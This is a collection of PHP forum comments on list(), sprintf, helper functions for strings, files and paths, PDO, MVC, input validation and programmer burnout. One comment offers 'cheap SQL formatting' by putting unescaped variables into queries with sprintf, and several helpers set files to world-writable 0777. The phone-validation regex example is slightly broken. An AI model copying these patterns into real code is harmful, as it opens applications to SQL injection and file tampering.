There are 2 problems with list() that make it rather unusable: 1. In most cases where you would use list(), you would be better off storing the values in an associative array (or object) to begin with. Basically whenever your array items already are different things or have different meanings. 2. In other cases, where your array is actually being used as arrays were intended to be used (storing a variable length array of the same type of item), list() blows up if the length of the array is less than the length of the list, instead of simply assigning the extra variables to null. So you have to wrap your list in bounds checks and fall-back code, and at this point you'd probably be better off assigning by key directly. In fact, for ALL of the suggested use cases on the php.net page, I can think of better, more reliable ways to approach the problem without using list(). Since we can just concatenate variables directly into strings in PHP, sprintf is of limited use (when compared to printf in C). From my experience, it's really only useful when you want to format a number to show a certain number of decimal places. You don't want to use sprintf for localization because some languages will require your tokens to be in a different order, and the formatting functions don't let you change the order of tokens passed in. Let's say you have a store item you wish to describe in a pre-defined way. An English language string might look like this: The :color :type is :description. While a French language string would look like this: Le :type :color est :description. Using sprintf, it'd look like: The %s %s is %s. Le %s %s est %s. Which will obviously put your adjective and noun in the wrong order in one of the languages.
What does the constructor for daemon look like? Also, which version of PHP are you using?
I probably should have replied earlier (work can be distracting at times). The problem was the snippet I supplied is inside of a method in the daemon class, so initiating it was kind of stupid when all I really needed to do was $this-&gt;daemon_full_db_exp().
Here's my handy snippet for center-cropping an image: // Taller than wider if (($imageWidth / $targetHeight) &lt; ($imageHeight / $targetWidth)) { $targetHeight = floor(($imageWidth / $targetWidth) * $targetHeight); $targetWidth = $imageWidth; $xAxis = 0; $yAxis = floor(($imageHeight - $targetHeight) / 2); } else { // Wider than taller $targetWidth = floor(($imageHeight / $targetHeight) * $targetWidth); $targetHeight = $imageHeight; $xAxis = floor(($imageWidth - $targetWidth) / 2); $yAxis = 0; }
Aww cmon guys, this does not deserve downvotes.
_sprintf()_ (and _printf()_) is great for any non-trivial string building, especially when you don't have a templating strategy (or to create your own cheap, mini-templating), whether or not you're localizing. It allows you to abstract your strings out from inline usage to wherever you want: const TPL_HTML_BODY = '&lt;html&gt;&lt;body&gt;%s&lt;/body&gt;&lt;/html&gt;'; const TPL_HTML_UL = '&lt;ul&gt;%s&lt;/ul&gt;'; const TPL_HTML_LI = '&lt;li class="%s"&gt;%s&lt;/li&gt;'; $evenOdd = array('evenClass', 'oddClass'); $items = array('item 1', 'item 2', 'item 3'); $li = array(); foreach ($items as $i =&gt; $item) { $li[] = sprintf(TPL_HTML_LI, $evenOdd[$i % 2], $item); } $list = sprintf(TPL_HTML_UL, implode('', $li)); $html = sprintf(TPL_HTML_BODY, $list); Or for cheap SQL formatting: const TPL_SQL_FOO = &lt;&lt;&lt;SQL SELECT id, foo, bar FROM foobar WHERE id = %d AND foo = '%s' AND bar = '%s' SQL; mysql_query(sprintf(TPL_SQL_FOO, $id, $foo, $bar ));
Why not just reference the 1st index directly? _list()_ is more useful when dealing with &gt;1 return.
Not to nitpick, but remove the i's, I's, 1's, o's, O's, and 0's. Depending on the chosen font your users can have a headache reading the password.
For #2, most of the time I use list() with explode() but as you said, list() blows up when the number of elements is smaller. In that case, I have my own function called explode_pad() which explodes and pads the array: function explode_pad($separator, $value, $length, $pad = null) { $result = explode($separator, $value, abs($length)); return array_pad($result, $length, $pad); } And then I would use it like this: list($key, $value) = explode_pad(':', "fookey:barvalue", 2); The only other time I use list() is when I absolutely know the length of the array and it's not more than 3. 
A couple of string handling snippets: /** * Limits the string to a specific number of characters. * * @param string String to limit * @param int Max length of string in characters * @param string String to append if limited. * @return string Limited string * @access public */ function str_limit($value, $length, $append = '...') { if (strlen($value) &lt;= $length) return $value; return substr($value, 0, $length-strlen($append)).$append; } /** * Limits the string to a specific number of characters splitting only on word * boundries. * * @param string String to limit * @param int Max length of string in characters * @param string String to append if limited. * @return string Limited string * @access public */ function str_limit_words($value, $length, $append = '...') { if (strlen($value) &lt;= $length) return $value; $length -= strlen($append); $words = explode(' ', $value); $totalLength = 0; $result = ''; foreach ($words as $word) { $totalLength += strlen($word); if ($totalLength &gt; $length) return trim($result).$append; $totalLength++; $result .= $word.' '; } return $value; } /** * Explode and pad the resulting array. * * @param string Separator for explode * @param string Value to explode * @param integer Length of array; negative to pad left. * @param mixed Pad value * @return array Resulting array * @access public */ function explode_pad($separator, $value, $length, $pad = null) { $result = explode($separator, $value, abs($length)); return array_pad($result, $length, $pad); } /** * Join two strings together with a separator. The separator is only included * if both strings are non-empty. * * @param string First string * @param string Second string * @param string Separator * @return string Join the string together * @access public */ function str_join($value1, $value2, $separator) { if ($value1 &amp;&amp; $value2) return $value1.$separator.$value2; if ($value1) return $value1; if ($value2) return $value2; return ''; } /** * Determine if one string contains the other. * * @param string Haystack * @param string Needle * @return boolean True if needle is contained in haystack * @access public */ function str_contains($haystack, $needle) { return (strpos($haystack, $needle) !== false); } /** * Determine if one string begins with the other. * * @param string Haystack * @param string Needle * @return boolean Haystack begins with needle * @access public */ function str_beginsWith($haystack, $needle) { return substr($haystack, 0, strlen($needle)) == $needle; } /** * Determine if one string ends with the other. * * @param string Haystack * @param string Needle * @return boolean Haystack ends with needle * @access public */ function str_endsWith($haystack, $needle) { return substr($haystack, -strlen($needle)) == $needle; } /** * Adds an english ordinal suffix to the specified number and returns it. * * @param integer Number * @return string Number followed by suffix * @access public */ function str_ordinal_suffix($value) { if ($value &gt; 10 &amp;&amp; $value &lt; 20) return $value.'th'; $num = $value % 10; if ($num == 1) return $value.'st'; if ($num == 2) return $value.'nd'; if ($num == 3) return $value.'rd'; return $value.'th'; }
[Since PHP 4.0.6](http://us.php.net/manual/en/function.sprintf.php), you've been able to swap positions using the normal format syntax: The %s %s is %s. Le %2$s %1$s est %s.
A couple of very useful file handling functions that can be used for caching. /** * Reads the contents of a file; returns false if file is currently locked. * * @param string Filename of file to read from * @param bool True to make function block, else false if not blocking. * @return mixed Contents of file or false if file is locked or error */ function freadlock($file, $blocking = false) { // Open the file and read the cache if (!$handle = fopen($file, 'rb')) return false; // If can't get lock (non-blocking call) just return if (!flock($handle, LOCK_SH + ($blocking ? 0 : LOCK_NB))) { fclose($handle); return false; } // Else read the cache data and return it $size = filesize($file); if ($size &gt; 0) $data = fread($handle, $size); else $data = ''; flock($handle, LOCK_UN); fclose($handle); return $data; } /** * Writes data to a file; if locked, returns false. * * @param string Filename of file to write * @param string Data to write to file * @param bool True to make function block, else false if not blocking. * @return bool false if locked, true if write successful. */ function fwritelock($file, $data, $blocking = false) { // Open the file if (!$handle = fopen($file, 'wb')) return false; if (!flock($handle, LOCK_EX + ($blocking ? 0 : LOCK_NB))) { fclose($handle); return false; } // Write the data fwrite($handle, $data); // Release the lock and return flock($handle, LOCK_UN); chmod($file, 0777); fclose($handle); return true; } /** * Writes data to a file; using a temporary file and then overwriting the * original file. This function is useful for writing PHP code files. * * @param string Filename of file to write * @param string Data to write to file * @return bool true if write successful */ function fwritetemp($file, $data) { $tmpFile = tempnam(dirname($file), 'tmp'); if (!$handle = fopen($tmpFile, 'wb')) return false; fwrite($handle, $data); chmod($tmpFile, 0777); fclose($handle); if (DIRECTORY_SEPARATOR == '\\' || !@rename($tmpFile, $file)) { @unlink($file); @rename($tmpFile, $file); } return true; }
&gt; Or for cheap SQL formatting: \*insert WHY WOULD YOU DO THAT macro here\* [PDO](http://us3.php.net/manual/en/book.pdo.php)! [Prepared statements](http://us3.php.net/manual/en/pdo.prepare.php)! [Placeholders](http://us3.php.net/manual/en/pdostatement.bindvalue.php)!
Path handling functions: /** * Combines an absolute path and a relative path producting a new absolute * path. * * @param string Absolute path * @param string Relative path * @return string Combinated absolute path * @access public */ function path_combine($absolute, $relative) { if (!$relative) return $relative; $absolute = strtr($absolute, '\\', '/'); $relative = strtr($relative, '\\', '/'); if (substr($relative, 0, 1) == '/') return $relative; if (substr($absolute, 0, 1) != '/') $absolute = '/'.$absolute; $absParts = array_filter(explode("/", $absolute)); $relParts = array_filter(explode("/", $relative)); $result = array_merge($absParts, $relParts); foreach($result as $i =&gt; $part) { if ($part == '.') $result[$i] = null; elseif ($part == '..') { if ($i &lt; 1) trigger_error('Relative path not found in absolute path.'); $result[$i - 1] = null; $result[$i] = null; } } return implode('/', array_filter($result)); } /** * Strips the beginning and ending slashes from a path. * * @param string Path * @return string Stripped path * @access public */ function strip_path($value) { if (substr($value, 0, 1) == '/') $value = substr($value, 1); if (substr($value, -1, 1) == '/') $value = substr($value, 0, -1); if ($value === false) $value = ''; return $value; } /** * Extension to mkdir; creates all subdirecties in path. * * @param string Path to create * @param int File mode (default to all) * @access public */ function mkdirall($value, $mode = 0777) { // Handle root links differently if (substr($value, 0, 1) == '/') { $dirs = explode('/', substr($value,1)); $dirstr = '/'.array_shift($dirs); } else { $dirs = explode('/', $value); $dirstr = array_shift($dirs); }; // Iterate the directories while(true) { if (!file_exists($dirstr)) { mkdir($dirstr, $mode); chmod($dirstr, $mode); } if (count($dirs) == 0) break; $dirstr .= '/'.array_shift($dirs); }; }
Edit: It is not about one index, it is about the list() construct capable of skipping a set of indices, by using empty arguments. How would one reference the 2nd index directly _without_ utilizing a temporary array reference? unpack(...)[1]; Will fail. Additionally, the list() approach - in conjunction with properly named variables - instantly clarifies what the line is doing, instead of using two lines. 
there you go buddy: http://www.php.net/manual/en/function.imagick-cropthumbnailimage.php
Use the mb_* methods, always, http://www.php.net/manual/en/book.mbstring.php and you have an interesting mix between underscore and camel case.
because it's 2011 already. function h(string $str) { return htmlentities($str, ENT_QUOTES, "UTF-8"); }
That's great if you have the ability to use them; I don't. \*insert BECAUSE I DON'T FUCKING CONTROL MY DEV PARAMETERS macro here*
&gt; unpack(...)[1]; &gt; Will fail. [Not for much longer.](http://schlueters.de/blog/archives/138-Features-in-PHP-trunk-Array-dereferencing.html) Also, although I've never used _unpack()_, it looks as though you could use the following, no? $result = current(unpack("c2/n", $binarydata));
It's true, these functions haven't been updated to work with unicode. They're all getting a rewrite soon. The strange mix of underscore and camel case has to do with these functions being global and trying to match (somewhat) PHP's style of function names. The rest of my code doesn't have any global functions at all (and have more consistent naming) -- I leave the global namespace to PHP functions and these sort of minor additions. 
Cool tip, thanks.
Yep, had read the article. It'd be a no-go to use for, say, an open-source project currently though. That would indeed be usable, however, when attempting to unpack a multitude of values, _list()_ becomes your only option: [example](https://github.com/timkurvers/World-of-Warcraft-DBC-Library/blob/master/lib/DBC.class.php#L132) at line #165 I will clarify the intent of my original post, thanks :)
[Krumo](http://krumo.sourceforge.net/) has completely changed the way I handle debugging. So pretty!
&gt; You will find it extremely hard - if not impossible - to maintain a second php script or thread running and listening on the socket you create to communicate with the irc server. As someone who has created a MUD in PHP, I believe that you may not truly understand the power that PHP has. PHP scripts have no issue handling non-blocking TCP/UDP connections, running as daemons or being multi-threaded. I have found that with PHP the limitation is never the language, it is the lack of knowledge.
I get so tired of people pushing PDO. Yes, 99% of us know about PDO, prepared statements, bind parameters, etc. But not all 99% of us are working in a system where that's feasible, if even allowed...
One step further: function h($string='',$quotes=ENT_QUOTES,$encoding='UTF-8',$double_encode=true) { return htmlentities($string,$quotes,$encoding,$double_encode); } Also, type hinting string doesn't work, only works on array or objects... Unfortunately...
Same. Where I work, we're _moving towards_ using PDO/prepared statements/etc., but we have **lots** of legwork before we can even begin to leverage it. To that end, creating SQL with sprintf() (as I demonstrated above) I believe will be beneficial to the porting that will need to be done in the future; it's certainly a vast improvement over building the SQL manually by string concatenation...
`global`, `register_globals`, and `call-time pass-by-reference`.
&gt;Why not $cars[$i] . "\t"? I think its cleaner. Why not implode("\t", $cars)? I think it's cleaner.
When using checkboxes, the reason you name your inputs like so: &lt;input type="checkbox" name="cars[]" value="BMW" /&gt; Is because with checkboxes more than one value can be selected, eg: $cars = array ( 0 =&gt; 'BMW', 1 =&gt; 'Nissan" } So what you have to do is loop through all the entries stored in the array (even if there is only one) to manipulate them: $carStr = ''; foreach( (array) $cars as $car) { $carStr .= sanitizeData($car) . "\t"; } fwrite($fhandle, $carStr); or just implode the array with the separator of your choice: $carStr = implode("\t", $cars); fwrite($fhandle, $carStr); 
caveat: provided html_errors is set to 'on'. As an added bonus: if you have xdebug installed you get lovely colour-coding on var_dump output too.
There's a big difference between knowing it exists and being unable to use it (for political or technological reasons), and not knowing it exists at all. People new to PHP are getting exposed to *way* too many horrible concepts and practices. A correct *initial* education will save a lot of trouble later un-learning bad things and correcting old code. This is why I try and push PDO as frequently as possible.
Welcome to the club. Sorry to join you here. For all the preaching I do about PDO, I'm constantly amused/horrified by my own work project's inability to use it.
If anyone wants to know why "-1" works, it's because the int given to error_reporting is used as a [bit field](http://en.wikipedia.org/wiki/Bit_field). ((int) $x) &amp; -1; will always return the value of $x, because PHP tends to treat binary numbers as unsigned and -1 "wraps around" to (PHP_INT_MAX*2)+1 (all the bits are set to '1').
&gt; \*insert WHY WOULD YOU DO THAT macro here* I was defending my practice against your insolent attack. There's a big difference between you asking if I knew about them (or even suggesting that there's better ways to do it), and simply admonishing me for trying to give practical advice. You chose the latter.
I think you mean line #162? Regardless, that is not the _only_ way to do it. What is so wrong with using a temporary variable....won't it just be GC'd in roughly 10 lines anyways? Don't get me wrong, I like _list()_ for some things, but as has been pointed out elsewhere there's problems with using it and I generally avoid it unless it has significant benefits -- which I've never been able to find other than the aesthetic factor.
Another step further: https://github.com/xmalloc/php-auto-escape (Why isn't it included already? Will it be included? Please, include it.)
Thats pretty cool and looks quite handy. Personally don't have a use for it as all of my markup is generated via markup classes yet have an upvote for relevance and interest.
Hmm. Are you using the socket_\* functions, or the stream_socket_\* functions?
well... because php is already running on an efficient web server most of the time, apache. rails needs a ruby-implemented webserver (more accurately, it listens to port 80 and implements an HTTP stack) because ruby wasn't intended to run on top of a webserver stack. in other words, what the fuck are you doing?
The basic idea is, you want to separate your code. You want your business logic, from your presentation logic, from your templates. Your models hold your business logic, which models the data in your database and governs how that data can be created, read, updated, deleted, manipulated, etc. Your presentation logic, or your controller, handles requests from your users, and decides what to show. It ties in your templates and models together. If there is a request for create a user, it receives a form input, uses a user model to create that data, and displays a template for the user. Your templates, or your views, is pretty much self explanatory. It has variables, which your controller fills in. The idea is to abstract your code enough, so that your controller or template doesn't have to worry about 'how to properly store this data in the database.' Some other class can magically do that for you, and you can assume it works. I would try a much simpler MVC framework like [limonade](http://www.limonade-php.net/) so you get a better idea of MVC. Cake and Symfony are really complicated, it turns out...and I learned MVC the hard way with Symfony. I didn't really get it until nearly 2 years later.
If that's all it does, then yes it is cleaner. But I was assuming this was just a code snippet and the real code is longer and more complex.
I use a G100 Gaming keyboard and bind these to their own G keys. Pressing them types them out in a split second. &lt;?php echo ; ?&gt; (cond ? true : false) foreach (array_expression as $key =&gt; $value) endforeach; 
So then the real code could also rely on numerical indices?
1. HTML code as requested &gt; &lt;input type="checkbox" name="chk_cars[]" value="ford"&gt;Ford&lt;/input&gt;&lt;br&gt; &gt; &lt;input type="checkbox" name="chk_cars[]" value="toyota"&gt;Toyota&lt;/input&gt;&lt;br&gt; &gt; &lt;input type="checkbox" name="chk_cars[]" value="mazda"&gt;Mazda&lt;/input&gt;&lt;br&gt; &gt; &lt;input type="checkbox" name="chk_cars[]" value="Holden"&gt;Holden&lt;/input&gt;&lt;br&gt; &gt; &lt;input type="checkbox" name="chk_cars[]" value="Nissan"&gt;Nissan&lt;/input&gt;&lt;br&gt; &gt; &gt; 2. $numcars = count($cars); 3. That's where I was wrong as 'wise_young_man' pointed out. 4. Will try this out. 5. foreach seems like a whole lot easier considering what I need to achieve. Thanks for your input. :)
I've been there. The good news is if you can work through it you're about to get a whole lot better at programming. 
I use it for salt generation, so not so much of an issue. Agreed for password generation though. Although I'd probably look for a php port of linux's passwd command
I went through this EXACT same thing a couple months back. Even posted here for help. Long story short, what i did to fix it: Stopped working on projects i didnt like working on. There were many, most were going no where. Even with the money, the shit was just uninteresting. Get away from the computer, and sleep. Sleep a lot. Eat a lot. Go outside. Get away from the computer for a while. If you dont know EXACTLY what you are going to do, do not touch the computer. As soon as you get blocked, get up and leave. As for the lonliness i completely understand. I often find myself turning clients into friends just to have people to talk to about relevant stuff. Someone should make a place where programmers can go to socialize, but also bounce ideas and just talk shop in a live environment. Forums don't seem to cut it.
This is completely natural. Especially once you're at the stage where all the cool problems are figured out, and you're stuck doing boring plumbing and maintenance. It's not exactly programmer's block in this case, perhaps it'd be more accurate to say you're "burned out" and need to rest / spend less time on the PC. Make sure you're doing exercise daily, getting physical activity. I find this helps a TON. A cup of coffee doesn't hurt either...
"Don't sound too good, it sounds tainted to me." I have heard this argument ('Until I get paid it is still my code and I can delete it from their server if they do not pay me') over and over and truthfully it is crooked bullshit. I have had issues where clients have decided not to pay, but being deceptive is not the proper way to build return clients. The best way I have found to resolve this issues is having clear communication, workflow and milestones. * All code I develop is hosted on MY server. * The client gets no remote access to my server. * The client is able to review the current project at any time. * We define a clear set of milestones which are listed in the agreement. * I receive payment in advance for each milestone and will not continue development on the next milestone till it is paid in advance. * Once the milestone has been reached the code is turned over to the client and a copy is placed on their server. * Any request for changes that fall outside of our agreement are charged at an hourly rate and must be paid in advance (this stops scope-creep) Once the project is done I will install the full project on the clients server, verify though shared session that all functionality is working and get the sign off. I guarantee my code and will fix any errors or bugs that popup as long as the code base is not modified in any way (I keep md5 hashes of the current status of all project files). If you use your head, act like a professional and plan in advance you have no reason to place back doors in the code. As a professional it makes me sick when I hear 'programmers' do this sort of stuff, you give us professionals a bad name.
This is why one should either use a DB framework like DBO or make their own DB class.
&gt;Someone should make a place where programmers can go to socialize, but also bounce ideas and just talk shop in a live environment. Forums don't seem to cut it. Indeed! 
these are awesome! thank you so much!
There are, and for the life of me I can't find the relevant links for you. Economic development centers are for small companies that just need to lease office space, but in San Francisco (I think) there are a couple geared just for tech startups and individuals. Places with open spaces to meet with others, but also small offices for work.
I need ze linkz! oh and btw i am not from the us (from israel) so yes link me and I will be envy.
Well if anyone is near San Diego and wants to talk PHP or coding etc, feel free to drop me a pm. Thanks for the reply. I'm going to get off my computer after a couple more replies.
I don't feel like all the cool problems are solved, actually. I have a lot of things I'm working on that I'm not quite sure of yet. They are missing elegant solutions. I don't just want to be a code monkey. I want a little more art involved. The burned out aspect is there, too, though.
That's the goal! Thank you, that's encouraging.
You should understand the practical part of using an MVC pattern, it's all about writing in a clean and organized way, making any maintenance later on easy. Imagine you created a big website using mainly a mysql database. 4 months later, you decide you want to switch to AWS S3 and some nosql variant. With an MVC pattern, you would just have to copy the model and rewrite the methods. It makes this process easy. Imagine you created a big website, and 4 month later, your boss wants you to make a mobile version of the website. With an MVC pattern, you just have to add a new View for each controller.
I run into this from time to time. Generally, putting a project down for awhile is the best course of action. However, sometimes when clients are waiting, you don't have this option. When this happens, I find it best to do work elsewhere. I get out of my office for a bit, and go to the park or the middle of the woods, and do work there instead. You might also read this post on Stack Exchange: http://programmers.stackexchange.com/q/23845/5194
stripslashes() ;)
Are you me? Cause that is my situation. Multiple projects. Unfocused. No team. School stuff looming too. We must persevere. 
Well , i guess it counts as 'constructs' : i never use **Singletons**.
This is all well and good for ImageMagick :) As far as I could tell, GD/GD2 doesn't have center crop.
Well fuck, I really should have seen that. 
I am in this exact same situation. Trying to balance school projects, while at the same time developing a website as contract work. I definitely have a lot of downtime spent just not being able to focus. I find that I really enjoy interesting school projects, but when it comes down to work where its just glue code connecting the database to a nice interface. Its just boring and tedious. Especially when there aren't a lot of constraints on the project.
agree, have been there many times
There are lots of these!! It's called "coworking", and in most major cities they have them. http://wiki.coworking.info/w/page/29303049/Directory#northamerica Here is a directory :) I've been to ones here (in NC) and it's usually a really chill atmosphere. You pay what you'd pay for a cup of coffee at starbucks and you're around lots of people who are doing the same thing as you. 
Wow. You are seriously me, but who is the evil one!? I too am working on a small website (for another department at my university), while I work on research projects for a professor. Mostly boring design stuff. The domain knowledge is also boring too me and does not motivate. Add these to school papers and physics, and my apathy and procrastination fucking skyrocket. How the fuck do I get out of this rut?
How do you guys deal w/ trying to hammer out a big project which you know you need to learn a lot in order to complete, while at the same time working at a non-programming job?
Dude... awesome.
I do work for a school and originally I was just the teacher that networked two buildings together with BNC (10-base 2) by stringing coax out a light fixture along a fence through a tree to a rooftop (secured by a bag of rocks on plywood) then down a rain gutter and under a door. I hopped on the server when the developer was taking forever to make small changes and taught myself how to break then fix small things and then larger things. If you need anything feel free to ask. I've been there. And this project is huge.
I think I'd remember piloting a moose, but my memory does fail me sometimes.
Thanks! That was a great thread to read.
You're forgetting out Django and Microsoft frameworks, which have out of the box development servers. The rails kids are just better at hyping things up.
I agree with you, having worked with CI. The other developers agreed that we needed to change frameworks. CI just wasn't modular enough and we spent a long time on forms. I like frameworks to be more opinionated like Django, Rails, Symfony. CI has really crappy OOP and form handling. Nearly everything is procedural in CI and just wrapped in an object to give the illusion of OOP ($this-&gt;). Views and Models are not OOP. The active record tool is not an ORM but only a a nicer way of doing queries. Testing sucks, you can only test from within the controller. Shit, I could go on, but you get the point. Frameworks like Symfony and Django have nice developer toolbars and command line interfaces. CI doesn't however. The only advantages in CI are that it is fast to get started and runs a little faster than other frameworks. But it really bites you in the maintenance stage later on. Oh yes, it does have good docs, but have you ever tried Django (python), the docs are the best of any open source project around I think. And you get a admin back-end out of the box with Django, which is great for sites where a few people control most of the content. Anyway, at the end of the day you have to write more lines of code, putting in more time and effort, which is why you are better off with something else.
Sorry, I don't understand your question.
String appends like that rapidly become unwieldy once you have a lot of text and variables. It's not cleaner at all.
Your HTML is not correct. There is no close tag to the INPUT element. If you are using XHTML, (which you shouldn't since it's depreciated), then you do close it, but you can't put anything in there. If you want to associate the text with the checkbox (so you can click on the text and it will toggle the checkbox) use the &lt;LABEL&gt; tag. Like this: &lt;LABEL&gt;&lt;input type="checkbox" name="chk_cars[]" value="ford"&gt;Ford&lt;/LABEL&gt; There is a also a method of having the text and input element not in the same area. Read up on LABEL for more.
true but they also really produce crappy thumbnails (compared to ImageMagick)
I had programmers block a long time ago, it usually has to do with you've lost enthusiasm and need a good break, also you need to start reading / learning as you are obviously bored of what you've been doing.
don't sit at the computer and attempt to force it out 90% of code is written away from your desk. you will see why once you get away. switch off for as long as it takes. the internet will be here when you get back.
This is why programmers love their [trees](http://www.reddit.com/r/trees).
Been there. Here's how I fixed it, the last time I had it. I took a day off and didn't use a computer, not even on a weekend. Lots of sleep, as well as a few hot baths with a movie going. Then, I started my own project idea, not my clients, and did it for 2 days, feeling really good about it. I then shelved it. It got my creative juices flowing again. So, I built project schedules for my client projects, and decided to get going again. It's working, so far.
Never heard of this, thanks for pointing it out http://www.w3schools.com/php/filter_validate_email.asp http://www.w3schools.com/php/php_ref_filter.asp
This somewhat reminds me of [Stacey](http://www.staceyapp.com)!
I'm using the stream_* functions; keeps it more versatile if you want SSL connections. I've been meaning to get the code up on github for some time now so I'll get something up there so you can take a look and get a link here. Since the front end is also jQuery based, see if you would like to take part in the development ;) A working version can be found here: http://p1.kiwiirc.com/
Short tutorial about filters and validation, since it was requested: **Edit:** This info is for *tutorial* purposes. To teach people what filters and validation are. This isn't a suggestion of the right way to handle phone numbers. _ A filter, just like real filters (air filters, water filters), removes impurities from the input. Impurities in this context refer to things like extraneous formatting, invalid characters, or potentially dangerous input like XSS. Validation happens after filtering and ensures that the input conforms to input constraints. As an example let's imagine we have a form that asks for a north american phone number. Our goal is to take the input and store it into a field in our database which is a column of type char(10) that should hold 10 consecutive digits. Let's say that our user is unaware of how we want the number and enters something like "(555) 012-3456". We're not too interested in the spaces or formatting characters. So our filter will be simple to start: remove all non-digit characters from the input. $phone = preg_replace('/\\D/', '', $_POST['Phone']); // $phone now holds "5555551234" That's a good start. Now we want to make sure the phone number is exactly 10 digits and valid according to [NANPA](http://en.wikipedia.org/wiki/North_American_Numbering_Plan) rules, which specifies 0-9 for all digits except the 1st and 4th digits which must be 2-9. $is_valid = (bool)preg_match('^[2-9]\\d\\d[2-9]\\d{6}$', $phone); // $is_valid is FALSE The input isn't valid. The user gave us a bogus phone number! We've prevented bad data from getting into our database. Inform the user and give him a chance to correct his mistake: &lt;?php if(!$is_valid): ?&gt; &lt;p&gt;You entered a bad phone number!&lt;/p&gt; &lt;p&gt;&lt;strong&gt;Are you stupid or just an asshole? Do it right this time!&lt;/strong&gt;&lt;/p&gt; &lt;p&gt;&lt;label for="Phone"&gt;Phone:&lt;/label&gt;&lt;input type="text" id="Phone" name="Phone"/&gt;&lt;/p&gt; &lt;?php endif; ?&gt; PHP has some built-in validation and filter functions. They're useful but limited. See [filter functions](http://www.php.net/manual/en/ref.filter.php) for reference. Eventually you'll find these functions aren't enough and you'll want to build your own library of custom filters and validation.
I worked through it a couple times, and ended up completely hating everyday I was programming after I began 'just pushing through'. Sure I can do it at any time, but eventually I found that just stepping away from the computer, relaxing and comfortably thinking about the problem gave me actual ideas and made the process easier. Perhaps not for everyone, but my not hating what I was doing turned out to be more important in the long run than just finishing this job now for a quick pay day.
This is how you can validate your whole POST data, using an array: http://pastie.org/1786885
Filtering phone numbers to only 10 numerical digits is a naive approach to handling that kind of data. It only works in a very limited geographical area, and not necessarily in all circumstances. Websites can be accessed from all over the world. Forcing a phone number to to numeric digits *in your code* means that you either to have a separate codebase for *every single country* you support, or you have to ignore a whole bunch of potential users. Then take into account what happens if phone is a required field (for some odd reason, whether it should be required or not is another discussion), and you have an american/canadian living abroad. They could use your site as normal, if they could get past registration. But their phone number probably won't match your filter and you've either lost a user or they have made up a phone number. Here's another scenario: You're asked by a client to implement a system that requests users phone numbers. At some point along the way, there is a need for users to enter their extension in the input along with their phone number. You didn't spec that field and the interaction that the client requests, so you inform them that you will have to bill them for the change, but they refuse. You have to come up with a solution, so you can either enable their demand and open yourself up to more of the same behavior, take a hard line and risk an unhappy client, or drop filtering and let people enter anything they want in the phone field, extensions, parens, dashes, dots or whatever they want to use. Let the user enter whatever data they want (so long as it's not gonna break things), and let them sort out the consequences if they enter it incorrectly. And you're probably never do this in real life, but insulting your users isn't going to win you a lot of sympathy, and is probably just going to piss people off. 
&gt; Then take into account what happens if phone is a required field [...] and you have an american/canadian living abroad. Or even, *gasp!*, a foreigner!
True, although I wanted to point out that this approach could fail for the desired user group on a technicality.
And right you are.
I love PHP for more than just web programming. I even like to use it when I wear my sysadmin hat. I use it for all sorts of utility functions and scripts. It's platform independent, it's can be run in CLI, I can sick our web dev at creating functions I need to manage our servers. * While it's not the fastest text parser, it's very straightforward, so I have used it to parse log files of various types and formats (xml, csv, raw, binary) and created notifications for specific events * With the same script I pull log data out of a database and evaluate it. * I log file server directory sizes to a DB * I then use that log data to graph resource size growth/trends over time * I use it to process data from multiple static HTML web forms and route the information into various systems (i.e. a reporting environment, a trouble ticket system, a workflow processing system, email notification systems, etc) * I automate user addition/removal from Active Directory groups for security management * I created a simple recursive script that grabs a folder's security permissions, the ADS groups applied, and then grabs the users in the ADS group, to display a 'who has access to what' report on-demand. * I use it for a "poor man's" single-shot [ETL](http://en.wikipedia.org/wiki/Extract,_transform,_load) Is PHP the *best* tool for these jobs? Probably not. Are there already systems/applications/programs out there that will do them without having to write them? Most likely. But these were easy solutions to the challenges I faced. And what I (and especially my boss) like is that I don't have hundreds of little scripts and programs in 4700 different languages (Batch, vbscript, WSH, COM, bash, perl, python, etc). If I ever leave this job, I won't feel like I've left my boss in a lurch. He can hire just about any moderate sysadmin and if they know (or are willing to learn) PHP, then they'll be in good shape. He doesn't have to worry about finding someone that knows .NET **and** vbscript **and** WSH **and** bash **and** perl **and** etc, etc, etc.
If you have something that really needs a phone number, the customer will most likely take care to input theirs correctly. If the number is not active etc, one can e-mail them and ask them for it. The approach you take is quite restrictive and would annoy anyone who might not fit the spec perfectly.
Yeah, I either get no reaction or I feel sick. Not for me.
I don't do this in practice. I kept things simple for tutorial purposes. 
I kept things simple for tutorial purposes. Personally, our filtering and validation library at work for phone numbers takes as a last parameter a format value, which does indeed have all countries covered. But that's overkill for a little tutorial that explains simply what filters are.
I'm pushing myself through this right now. You just have to tackle the problems that bother you. If a solution or pattern always felt clunky, and you've always felt like there was no 100% way to do it, find the way thats been eluding you for this long.
Here's what I've got so far for the socket server. It's obviously nowhere near complete or anything :) https://gist.github.com/a9d98e18f9a42725527b
I really like this approach.
I would recommend not combining eating and sleeping alot.
Stop asking this idiot questions. He's just a spambot. Check his history.
I've never hated anything about programming, except maybe javascript prior to jquery. The only problems I've ever had where work made me miserable revolved around the people I was working for and how they did things. Namely they never budgeted enough time or money to do anything properly and refused to cut out frills the client couldn't actually afford and didn't ask for. That was always stressful. I blame Sales. The actual code writing part has always been fun. But there do come times in a programmer's development where he or she reaches a level of competence that allows him to see more clearly his own ineptitude. This can be frustrating because you see clearly where you're weak but not so clearly how to fix the problem. This is what I am saying one must work through. There's good code on the other side. It's a lot easier though if you can accept and acknowledge that not all your code is top notch, never will be, and doesn't really have to be. Just make sure to format it well and leave yourself reminders of why you did something a particular way. Some might be surprised how much of a difference that makes.
Makes sense to me. There's so much cruft around the net that some people will just copy things verbatim and not understand what the problems behind them are. I hate to be "that guy", but it's worth mentioning at least. Phones and email address are particularly bad for filtering data.
That is definitely different than what I was talking about, I too love attacking a difficult problem having no idea how to solve it at first, and ultimately coming to a solution in a way you never thought of before. I'm more talking about the repitive programming tasks (that can't be automated), but are necessary for a certain job.
Maybe your shit ain't dank enough?
People should use compact() more. Really handy when you've got a lot of local scope variables you want to package up and move somewhere else (for instance, from a Controller to a View).
I've come to think of those jobs as bread and butter. The challenging stuff is fun, but the margins are thin. The easy stuff I've done a million times before isn't exciting, but I can bill a lot for it. And for me, since I am literally going to be writing code at least 4 hours every day, 6-7 days a week, on top of the other responsibilities and processes involved in development, a little drudgery can be relaxing. But your mileage may vary.
Write down the absolute next tasks for each project. This will clear things up
That ... has nothing to do with A/B testing, and no, symfony is already in your way.
Yeah, that cannot ever work, by definition. Welcome to NAT.
